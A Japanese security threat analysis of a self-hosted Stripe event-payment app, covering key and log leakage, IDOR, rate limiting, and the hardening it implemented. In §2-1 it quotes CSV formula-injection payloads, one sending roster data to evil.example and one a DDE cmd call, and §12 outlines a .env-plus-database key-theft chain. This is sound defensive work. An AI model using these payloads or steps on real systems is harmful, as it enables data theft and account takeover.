# セキュリティ・脅威分析（情報漏洩リスクの洗い出し）

> 本ドキュメントは、本アプリ（自己ホスト型 イベント事前決済）における
> **情報漏洩・不正操作のリスク**を、実装コードを精査して洗い出したものです。
> 攻撃者視点（red team）での攻撃経路も含みます。対策の優先度付きで末尾にまとめています。
>
> 作成日: 2026-06-12 ／ 対象ブランチ: `claude/loving-hawking-m22ci7`
> 調査方法: 静的コードレビュー（`src/`, `public/`）。本番への変更・送信は行っていません。

---

## 0. データの所在マップ（実装で確認）

| 保管場所 | 中身 | PII? |
|---|---|---|
| `.env` | `STRIPE_SECRET_KEY`（本番は `sk_live_`）、`STRIPE_WEBHOOK_SECRET`、Stripe Price ID、`MAIL_FROM` | 鍵（最重要） |
| Stripe（外部） | 参加者の氏名・メール・電話・人数・**備考(note)**・決済/顧客データ | ◎ 大量PII |
| `data/app.sqlite` | 主催者の email・**password_hash(bcrypt)**・stripe_account_id・plan・招待・イベント定義・**password_resets トークン**・login_attempts(email+IP) | ○ |
| `logs/mail.log` | 送信メール全文（宛先・本文＝**参加者氏名/メール**、**パスワード再設定リンク=トークン**） | ◎ |
| PHP セッション | `tenant_id`・`csrf_token`（Cookie） | 認証情報 |

**良い設計（前提）**: `src/bootstrap.php` の設計思想どおり、**カード情報は一切サーバーを通りません**（入力は Stripe Checkout 上）。
**ただし**、Stripe を開ける鍵（`.env`）と PII 入りログ（`logs/mail.log`）がサーバー上に存在するため、
「PII は Stripe 側だからサーバー漏洩は軽微」という認識は **危険**。サーバー1台の侵害が Stripe 預けデータ全体の漏洩に直結し得ます。

---

## 1. データ保管場所の漏洩リスク

### 1-1. 🔴 最重要: `.env` / Stripe シークレットキー漏洩
`STRIPE_SECRET_KEY`（本番 `sk_live_…`）が漏れると、この1本で攻撃者は:
- **全イベント・全参加者の PII を取得**（`Customer::all` / `Checkout\Session::all`）。備考には健康情報（アレルギー）が入りうる＝**要配慮個人情報**。
- **返金の実行**（`Refund::create`）＝売上毀損。
- 決済履歴・残高の閲覧、（権限次第で）課金・Payment Link 作成など、**Stripe アカウントの実質乗っ取り**。

→ **この鍵の漏洩＝Stripe に預けた全データ＋金銭の漏洩。**
漏れる経路: サーバー侵入／`.env` 誤コミット／バックアップ平文保管／docroot 誤設定（§4）／環境変数のログ出力。

### 1-2. 🔴 見落としやすい第2のPII貯蔵庫: `logs/mail.log`
`src/mail.php:22-23` が**送信メール全文を平文でファイル追記**（`.gitignore` 済みだがサーバー上に残る）。漏れると:
- 当日支払い確認メール本文＝参加者氏名・宛先メール（`checkout.php:150`）。
- **パスワード再設定メール本文＝有効な再設定リンク（トークン）**（`forgot.php:25`）。トークンは1時間有効 → 漏洩時刻次第で**主催者アカウント乗っ取り** → 管理画面 → Stripe データ閲覧/返金。
- ローテーション設計が無く**無限増加**。過去分が累積。

### 1-3. 🟠 SQLite DB（`data/app.sqlite`）漏洩
参加者 PII は無い（認識どおり）。漏れると:
- 主催者の **email + password_hash**（bcrypt は良好だが、弱いパスワードはオフライン解析で破られうる。複雑性・流出パスワード照合なし、要件は8文字以上のみ）。
- **password_resets の未使用トークン** → 有効期限内なら即アカウント乗っ取り → §1-1 へ連鎖。
- `stripe_account_id`・`plan`・招待コード・login_attempts(email + IP)。

### 1-4. 🔴 docroot 誤設定（設定ミス由来で最も起きやすい）
公開ディレクトリは `public/` 想定。**プロジェクト直下を公開**すると `/.env`・`/data/app.sqlite`・`/logs/mail.log` が**直接ダウンロード可能**になり §1-1〜1-3 が同時成立。
現状 `data/` は `mkdir(...,0700)`・`.gitignore` 済みだが、**Web サーバーレベルの deny 設定（`.htaccess` / nginx location）が見当たらない**。CoreServer 等で docroot を `public/` に正しく向けることが大前提。

### 1-5. 🟠 セッション乗っ取り / Cookie 漏洩
`session_boot()`（`tenant.php:11`）は `httponly` + `SameSite=Lax` で良好。ただし **`Secure` は HTTPS 検出時のみ**付与。プロキシ構成で `HTTPS`/`X-Forwarded-Proto` が正しく渡らないと Cookie が平文回線に乗り得る → セッションID漏洩 → ログイン不要で管理画面侵入。

### 1-6. 🟠 CSV エクスポート / 端末側の二次漏洩
`admin/export.php` が名簿（氏名・メール・電話・備考）を CSV 出力。ファイルは主催者 PC・メール添付・クラウド同期に残りやすく、アプリ外の漏洩面になる（端末紛失・共有ミス）。

### 1-7. 🟡 Webhook 署名シークレット漏洩
`STRIPE_WEBHOOK_SECRET` が漏れると `webhook.php` に偽イベントを署名付きで送り、テナントの `plan` を不正改ざん可能（課金/上限の不正操作）。PII 影響は小。

### 1-8. 🟡 軽微・補足
- `error_log` 出力（refund/checkout 等）に例外メッセージ断片。カード情報は含まれない。
- アカウント存在の秘匿は良好（`create_password_reset` は未登録メールでも `null`）。
- 備考(note)は要配慮個人情報級 → 影響度を一段上げて評価。

---

## 2. 攻撃者視点（red team）の追加経路

### 2-1. 🔴 CSV 数式インジェクション（認証不要・受動的）
`export.php`（38–71行）は参加者の氏名・メール・電話・備考を `fputcsv` でそのまま出力し、
**先頭の `= + - @` を無害化していない**。これらは**未認証の参加者が `apply.php` で自由入力**した値。

攻撃:
1. 氏名や備考に `=HYPERLINK("https://evil.example/?x="&A1&B1&C1,"x")` や `=cmd|'/c calc'!A1` を入れて申込。
2. 主催者が CSV をダウンロードし Excel/Sheets で開く。
3. **数式が実行**され名簿の他セル（全参加者の氏名・メール・電話）を攻撃者へ送信、またはコマンド実行。

→ サーバー権限も鍵も不要。主催者の操作だけで名簿が丸ごと抜ける。**最有力の窃取経路。**

### 2-2. 🔴 テナント間 IDOR（破れたオブジェクトレベル認可）— 確証あり
操作系は**「イベントが自分のものか」しか検証せず**、対象 `customer_id` / `payment_intent` がそのイベント/テナントに属するかを**検証していない**。全テナントが**単一の共有 Stripe アカウント**を使うため、これらIDはグローバル名前空間。

| エンドポイント | 所有チェック | 危険な操作 |
|---|---|---|
| `attend.php:33` | イベントのみ | `Customer::update($customerId)`（45行）＝他テナント顧客のmetadata改ざん |
| `onsite_cancel.php:32` | イベントのみ | `Customer::retrieve($customerId)->delete()`（44行）＝**他テナント参加者を削除** |
| `refund.php` | イベントのみ | `Refund::create(['payment_intent'=>$pi])`＝**他テナント決済へ不正返金** |
| `onsite_collect.php` | イベントのみ | 集金フラグ改ざん |

攻撃: 自分のイベントIDで所有チェックを通過させ、POST に他テナントの `cus_…`/`pi_…` を入れる → **削除・不正返金・改ざん**。
（対象IDの入手が前提なので「既知ID悪用」型。総当たりではないが、認可の欠落は明確な脆弱性。）
**読み取り側（名簿/CSV）はイベント所有チェックで守られている**——破れているのは**書込・削除・返金**側。

### 2-3. 🟠 未認証エンドポイントの濫用（情報の外部“発信”悪用）
- `checkout.php` 当日経路は**未認証・レート制限なし・CAPTCHA なし**で `Customer::create` ＋ `send_mail`（150行）→ **任意アドレスへの確認メール爆撃（自ドメインからのスパム＝レピュテーション失墜）**、Stripe へ偽顧客投入。
- `forgot.php` レート制限なし → 標的主催者への再設定メール爆撃＋トークン量産。
- `signup.php` オープン・制限なし → 偽アカウント大量作成・DB 肥大。

---

## 3. アーキテクチャ／テナンシーの構造的リスク

### 3-1. 🔴 共有 Stripe キー × オープン多テナント＝PII・金銭の合流
README は「参加費は自分の Stripe アカウントへ直接入金／Connect 不使用」と謳うが、実装は常に `$account = null`＝**`.env` の単一キー**。
`event.coresv.com` のように**誰でも登録できる共同ホスト**だと、**全主催者の参加者 PII と売上がデプロイ者ただ1つの Stripe アカウントに合流**する。
- テナント分離は**論理的（アプリの ownership チェック）のみで物理的には未分離**。§2-2 の IDOR はこの構造の直接的帰結。
- **プラットフォーム運営者（＝キー保有者）は全テナントの PII を閲覧可能**。「各自の Stripe」という説明とのギャップは規約・プライバシーポリシー上のリスク（誤認・同意の欠如）。

---

## 4. 可用性・コスト増幅

### 4-1. 🟠 未認証ページが Stripe 全件リストを誘発
`o.php` / `apply.php` は残席計算で `event_headcount`→`fetch_event_participants`（`Session::all`＋`Customer::all`、最大100件＋ページング）を毎回呼ぶ。**キャッシュなし**。
無認証で連打 → **Stripe API レート上限消費・課金増幅・タイムアウト**。当日申込量産で**定員を埋め、本物の参加者に「満員」を出す**業務妨害も可能。

---

## 5. 認証まわりの細部

- **5-1 🟡 ログインのタイミングオラクル**: `login_tenant`（`tenant.php:139`）はアカウント無→即 return、有→bcrypt 実行。応答時間差でメール存在を列挙可能。
- **5-2 🟠 forgot/signup にレート制限なし**（login にはある）。
- **5-3 🟡 Cookie `Secure` は条件付き**＋セッションのアイドル/絶対タイムアウトなし。
- **5-4 🟡 セキュリティヘッダ皆無**（CSP / X-Frame-Options 等）→ クリックジャッキング、XSS 発生時の被害拡大。
- **5-5 🟡 `tenant_id` の二重利用**: `tn_…` を公開URL（`o.php?t=`）の識別子と内部参照の両方に使用。共有リンク経由で識別子が事実上公開。

---

## 6. 保存データの機微性
備考(note)に**アレルギー等の健康情報＝要配慮個人情報**が入る前提。CSV（§2-1）や一覧の `title` 属性に出力されるため、漏洩時の影響度は一段重く評価すべき。

---

## 7. 影響度ランキングと対策優先度

### 攻撃者が選ぶ順番（窃取の現実性）
1. **§2-1 CSV 数式**: 認証も鍵も不要、申込1件仕込んで待つだけで名簿全取得。
2. **§1-1 `.env`/Stripe キー**: 取れれば全部。サーバー/バックアップ/docroot 誤設定狙い。
3. **§1-2 mail.log → 再設定トークン → アカウント乗っ取り**。
4. **§2-2 IDOR**: 登録して他テナントのデータ破壊・不正返金。
5. **§2-3 / §4-1**: 妨害・スパム・コスト増幅。

### 推奨対策（優先度順）
| 優先 | 対策 | 該当 |
|---|---|---|
| 1 | **CSV 数式無害化**: 先頭が `= + - @` の値を `'` でエスケープ（全フィールド） | §2-1 |
| 1 | **IDOR 封じ**: 操作系で `customer_id`/`payment_intent` がそのイベント所属かを Stripe 側 metadata で検証してから更新/削除/返金 | §2-2 |
| 1 | **未認証エンドポイントのレート制限/CAPTCHA**（checkout 当日・forgot・signup） | §2-3, §5-2 |
| 2 | **`.env`/`logs/`/`data/` を docroot 外＋Web deny、docroot を `public/` に固定** | §1-1, §1-4 |
| 2 | **mail.log のローテーション＋再設定トークンはログに残さない（リンクは記録しない/マスク）** | §1-2 |
| 2 | **Stripe キーのローテーション手順整備**（漏洩想定時の即時失効） | §1-1 |
| 3 | **Cookie `Secure` 常時付与（プロキシ前提の HTTPS 判定見直し）＋セッションタイムアウト** | §1-5, §5-3 |
| 3 | **セキュリティヘッダ追加**（CSP / X-Frame-Options / Referrer-Policy 等） | §5-4 |
| 3 | **パスワード強度ポリシー強化／既知流出パスワード照合** | §1-3 |
| 4 | **テナンシー方針の明確化**: 単独運営前提なら「オープン登録」を閉じる、または Stripe Connect で物理分離。規約・プライバシーポリシーと実装を一致させる | §3-1 |

---

---

## 8. 実装済み対策（本ブランチ `claude/loving-hawking-m22ci7`）

優先度表の項目を以下のとおり実装済み。ローカル単体テスト・スモークテストで動作確認済み（本番は未変更）。

| 対策 | 実装内容 | 主な変更ファイル |
|---|---|---|
| CSV 数式無害化 | `csv_cell()` を追加し、先頭が `= + - @` / Tab / CR の値に `'` を付与。名簿の参加者由来フィールド全てに適用 | `src/bootstrap.php`, `public/admin/export.php` |
| IDOR 封じ | `find_event_participant_by_customer()` / `..._by_payment_intent()` を追加し、出席/集金/当日取消/返金で「対象がそのイベントの参加者か」を Stripe 側で検証 | `src/bootstrap.php`, `attend.php`, `onsite_collect.php`, `onsite_cancel.php`, `refund.php` |
| レート制限 | 汎用 `rate_limit_check()` ＋ `rate_events` テーブルを追加。signup(5/h)・forgot(5/h)・apply=checkout(20/h) を IP 単位で制限 | `src/db.php`, `src/tenant.php`, `signup.php`, `forgot.php`, `checkout.php` |
| docroot 保険 | `.env`/DB/ログの拡張子・ドットファイルを deny する `.htaccess`、`logs/.htaccess`、`data/.htaccess`（実行時自動生成） | `.htaccess`, `logs/.htaccess`, `src/db.php` |
| mail.log 強化 | 再設定リンク/トークンをログ記録時にマスク（`mask_secrets_for_log`）＋サイズローテーション（`MAIL_LOG_MAX_BYTES` 既定5MB） | `src/mail.php` |
| Cookie/セッション | `Secure` を HTTPS 配信時（`APP_BASE_URL` が https を含む場合も）常時付与＋アイドルタイムアウト30分 | `src/bootstrap.php`(`request_is_https`), `src/tenant.php` |
| セキュリティヘッダ | CSP（`frame-ancestors 'none'` 等）／X-Frame-Options DENY／X-Content-Type-Options／Referrer-Policy／HTTPS時 HSTS を全レスポンスに付与 | `src/bootstrap.php` |
| パスワード強度 | `assert_password_strength()`：8文字以上＋よくある弱PW・同一文字反復を拒否。登録/変更/再設定に適用 | `src/tenant.php`, `reset.php` |
| テナンシー方針 | 運営アカウントのオープン登録は**既定で停止**（`ALLOW_SIGNUP=1` を明示したときだけ開く）。運営者の追加は招待か `bin/console.php create-admin` | `signup.php`, `.env.example` |

### CAPTCHA（実装済み）
- **Cloudflare Turnstile** を `src/captcha.php` で実装。`TURNSTILE_SITE_KEY`＋`TURNSTILE_SECRET_KEY` を `.env` に設定すると signup/forgot/申込フォームで有効化（未設定なら素通り＝既存動作を壊さない）。レート制限と併用。CAPTCHA 有効時は CSP にウィジェット配信元を自動許可。

### Stripe Connect 物理分離（§3-1・実装済み／後方互換）
- `STRIPE_CONNECT_CLIENT_ID`（ca_...）を設定すると、主催者がダッシュボードから**自分の Stripe を OAuth 接続**でき、以降の決済・名簿(PII)・入金が**主催者ごとに物理分離**される。
- 接続情報は `tenants.stripe_account_id` に保存。全 Stripe 呼び出しは `effective_stripe_account()` で「接続済み＝接続アカウント／未接続＝プラットフォーム鍵」に振り分け。
- **後方互換**: client_id 未設定、または未接続の主催者は従来どおりプラットフォーム鍵で動作（既存運用を壊さない）。
- 実装: `connect.php`（OAuth start/callback/disconnect）、`bootstrap.php`（`connect_enabled`/`effective_stripe_account`/`init_stripe` で client_id 設定）、各管理・公開エンドポイント。
- **要本番検証**: OAuth トークン交換は実 Connect 資格情報が必要。Stripe で Connect を有効化し client_id 設定後、テスト接続→決済→名簿表示→返金の一連を確認すること。完全分離を強制したい場合は「未接続なら事前決済を受け付けない」ガードの追加を検討（現状は後方互換のためフォールバック）。

### CSP 厳格化（実装済み）
- **`script-src` から `'unsafe-inline'` を撤廃**。自ホスト＋リクエスト毎の **nonce**（`csp_nonce()`）のみ許可。
  - Chart.js を自己ホスト化（`/assets/chart.umd.min.js`、CDN依存を排除）。
  - インラインの動的 `<script>`（dashboardのグラフ、applyの合計計算）は `nonce` 付きに変更。
  - インラインイベントハンドラ（`onclick`/`onchange`/`onsubmit` 計11箇所）を全廃し、共通 `/assets/app.js`（`.js-select`/`.js-autosubmit`/`form[data-confirm]`）と nonce 付きスクリプトに集約。
- **`style-src` から `'unsafe-inline'` を撤廃**し、`<style>` 要素は nonce 必須に。プレーンな `style=""` 属性のみ `style-src-attr 'unsafe-inline'`（CSP3の粒度指定。JS実行不可で低リスク）で許可。
- 実ブラウザ（Chrome）で apply/login/policy を確認: **CSP違反・JSエラー 0件**、合計計算・支払い方法切替も正常動作。
- さらに厳格化したい場合は、残る `style=""` 属性（48箇所）をクラス化して `style-src-attr` も撤廃可能（任意・低優先）。

---

## 9. 付録: Stripe シークレットキー ローテーション手順（漏洩想定時）

1. Stripe ダッシュボード → 開発者 → API キー → **Secret key を Roll（無効化＋新規発行）**。古いキーは即時失効する。
2. サーバーの `.env` の `STRIPE_SECRET_KEY` を新キーに差し替え（`sk_live_…`）。
3. PHP-FPM / Apache を再起動（またはアプリの再読込）して新キーを反映。
4. Webhook を使っている場合は `STRIPE_WEBHOOK_SECRET` も再生成・差し替え。
5. Stripe のログで、漏洩期間中の不審な API 利用（想定外の返金・顧客取得）が無いか確認。
6. `logs/mail.log` 等、鍵やトークンを含み得るファイルを点検・必要なら破棄。
7. 影響があれば関係者・参加者へ通知（個人情報保護法の漏えい報告要件を確認）。

> キーは環境変数（`.env`）のみで管理し、コード・Git・バックアップに平文で残さないこと。`.env` のバックアップは暗号化して保管する。

---

## 10. データガバナンス方針（マルチテナント・管理者最小権限・ゼロ閲覧）

**目標**: マルチテナントを維持しつつ、各主催者が自分のデータを自己責任で管理する。プラットフォーム管理者は情報を極力持たず、保持が必要な情報も管理者を含め誰も閲覧できない状態を理想とする。

### 10-1. データ最小化（システムが持つものを最小に）
| データ | 保管場所 | 備考 |
|---|---|---|
| 参加者の氏名・メール・電話・備考・決済 | **各主催者の Stripe アカウント**（Connect 接続時） | プラットフォーム DB には**保持しない** |
| 主催者の email / password_hash | プラットフォーム DB | password はハッシュのみ（復元不可） |
| イベント定義・プラン・接続アカウントID | プラットフォーム DB | PII ではない運用メタデータ |

→ **参加者 PII はシステム（プラットフォーム DB）に存在しない**。Connect により主催者ごとに物理分離され、入金も各主催者の口座へ直接。

### 10-2. 管理者の最小権限（ゼロ閲覧）
- プラットフォーム管理者（`is_admin`）の権限は**招待コードの発行のみ**（`invites.php`）。
- **他テナントのイベント・参加者・決済を閲覧する管理画面は存在しない**。全データ取得系（`index.php`/`export.php`/`dashboard.php` 等）はログイン中テナント本人の所有データに限定（所有チェック＋IDOR 対策済み）。
- したがって**管理者であっても他主催者の参加者 PII を画面から閲覧できない**。

### 10-3. マルチテナント維持
- オープン登録は `ALLOW_SIGNUP`（既定 `0`）で**停止**。`.env` に `ALLOW_SIGNUP=1` を書いたときだけ受け付ける（設定漏れで開かないよう fail-closed）。
- 各主催者は Stripe を自分で接続（`connect.php`）し、自分のデータを自分の責任で管理する。

### 10-4. 残る信頼境界（正直な明示）と対策
- **唯一の例外**: Connect の名簿読み出しは、技術的にはプラットフォームの秘密鍵＋`stripe_account` ヘッダで行うため、**サーバー／プラットフォーム鍵を保持する運用者は、Stripe API を直接叩けば接続アカウントのデータにアクセスし得る**（OAuth Connect の構造上の性質）。アプリ自体には管理者向けの横断閲覧機能は無いが、鍵保持者の「能力」としては残る。
- これを限りなく小さくする対策:
  1. **Stripe 制限付きキー（Restricted key）** を使い、プラットフォーム鍵の権限を必要最小限（このアプリが使う Checkout/Customer/Refund 等）に絞る。
  2. プラットフォーム鍵で**横断的な名簿取得を行うコードを足さない**（現状ポリシーを維持）。
  3. サーバーアクセス・鍵アクセスの**監査ログ**と**鍵ローテーション**（§9）を運用。
  4. 「管理者は参加者 PII を見ない／見られない」を**運用規程**として明文化し、規約・プライバシーポリシーに反映。
- **保持必須データの堅牢化**:
  - DB は公開領域外＋`0700`＋`.htaccess` deny（§1-4 対応済み）。
  - password は bcrypt（管理者もパスワード本体は不可視）。
  - さらに強化するなら、ディスク暗号化／SQLCipher による DB 暗号化（鍵は OS のシークレットストアや環境変数で分離管理）を検討。※アプリが復号鍵を要するため、サーバー侵害時の完全防御にはならない点に留意。

---

## 11. 第3ラウンド: 追加ハードニング（実装済み）

第2ラウンド後の再点検で見つけた残存リスクへの対応。

| 課題 | 対応 | 変更 |
|---|---|---|
| CAPTCHA が fail-open（siteverify 不達時に通過） | signup/login は **fail-closed**（拒否）、apply/forgot は可用性優先で通過を選択可能に | `captcha_verify($t, $failClosed)`（`captcha.php`）, `login.php`/`signup.php` |
| IP制御がプロキシ/NAT配下で誤作動・回避可 | `TRUSTED_PROXY=1` のときのみ `X-Forwarded-For` 先頭を採用（既定は REMOTE_ADDR で偽装防止） | `client_ip()`（`tenant.php`）, `.env.example` |
| ログインのアカウント列挙（タイミング） | 未知メールでもダミー bcrypt 検証を行い応答時間を平準化 | `login_tenant()`（`tenant.php`） |
| `success.php` が session_id 単独で購入者メール表示 | 完全メール表示を廃止し、マスク表示（`y***@…`）に | `success.php` |
| mail.log の件名にイベント名 | 件名の具体名を `…` にマスク（`mask_subject_for_log`） | `mail.php` |
| ヘッダ余地 | CSP に `object-src 'none'`、`Permissions-Policy`、COOP、CORP を追加 | `bootstrap.php` |
| 表メンテ | `rate_events`/`headcount_cache` の確率的掃除＋イベント削除時のキャッシュ除去 | `tenant.php`, `bootstrap.php` |

### 意図的に見送り（要件により）
- **プラン課金の強制（ペイウォール）**: 現状は**無料運用**の方針のため**未実装のまま**（`tenant_month_event_count` は未使用）。セキュリティ脆弱性ではなく収益保護機能の話。将来「フリー＝累計N件」を導入する際は `plan_catalog()` を累計ベースに変更し `event_save.php` にガードを追加。回避防止（削除して作り直し）には作成回数の記録設計が別途必要。
- **定員のオーバーセル競合（TOCTOU）**: DBロック設計が要るため別枠。現状はレート制限/CAPTCHAで悪用を緩和。

---

## 12. 実証されたAPIキー窃取（フラット配置）と対策（実装済み）

### 実証した攻撃（ホワイトボックス・許可済み）
フラット配置（docroot 直下にアプリ一式）で **`.htaccess` が無効な環境**（Apache `AllowOverride` オフ / nginx 等）では、未認証の攻撃者が次の手順で**主催者の Stripe 鍵を完全復元**できることを実証:
1. `GET /.env` → `APP_KEY` を取得
2. `GET /data/app.sqlite` → SQLite DB を丸ごと取得
3. DB 内 `tenants.stripe_secret_enc` を、盗んだ `APP_KEY` で復号 → `rk_live_…` を平文回収

→ アプリのロジックには鍵を出力する欠陥は無い（表示は常にマスク）。**問題は「DB と .env が Web 公開領域に同居し、サーバー設定次第で直接ダウンロードされうる」配置リスク**。

### 対策（実装済み・機能は不変）
- **DB を公開領域外に出すことを強制検知**: `security_warnings()`（`bootstrap.php`）が、SQLite が `DOCUMENT_ROOT` 配下にある場合に**全管理ページ上部へ重大警告**を表示（`_app_header.php`）。`.env` が公開領域内の場合も警告。
- 運用は `.env` の **`DB_PATH` を公開ディレクトリ外の絶対パス**に設定すれば解消。**DB が取得不能になれば、APP_KEY が漏れても暗号化鍵は復号できず、窃取連鎖が切れる**。
- 併せて `.htaccess`（ルート/各機密ディレクトリ）で直アクセス拒否（Apache が `.htaccess` を尊重する場合の一次防御）。
- 検証: DB が docroot 内 → 警告表示／`DB_PATH` 外出し → 警告消滅・`/data/app.sqlite` が 404・既存機能は 200 で正常。

---

### 補足: 良好に実装されている点
- カード情報を一切サーバーで扱わない（Stripe Checkout）。
- SQL は全てプリペアドステートメント（SQLi なし）。
- 出力は概ね `e()`（htmlspecialchars）でエスケープ。
- CSRF トークン検証あり、状態変更は POST。
- ログイン総当たり対策（`login_attempts`）、セッション ID 再生成（`session_regenerate_id(true)`）。
- パスワード再設定でアカウント存在を秘匿。
